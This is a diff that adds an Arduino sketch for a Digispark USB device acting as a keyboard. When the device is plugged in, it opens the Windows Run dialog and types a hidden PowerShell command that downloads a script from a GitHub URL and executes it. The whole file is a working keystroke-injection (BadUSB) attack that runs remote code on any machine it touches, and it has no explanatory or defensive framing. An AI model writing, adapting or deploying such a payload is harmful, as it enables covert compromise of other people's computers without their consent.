@@ -1,0 +1,13 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  // this is generally not necessary but with some older systems it seems to
+  // prevent missing the first character after a delay:
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/raecer/digispark/d/d')\"");
+  }
+
+void loop() {
+}
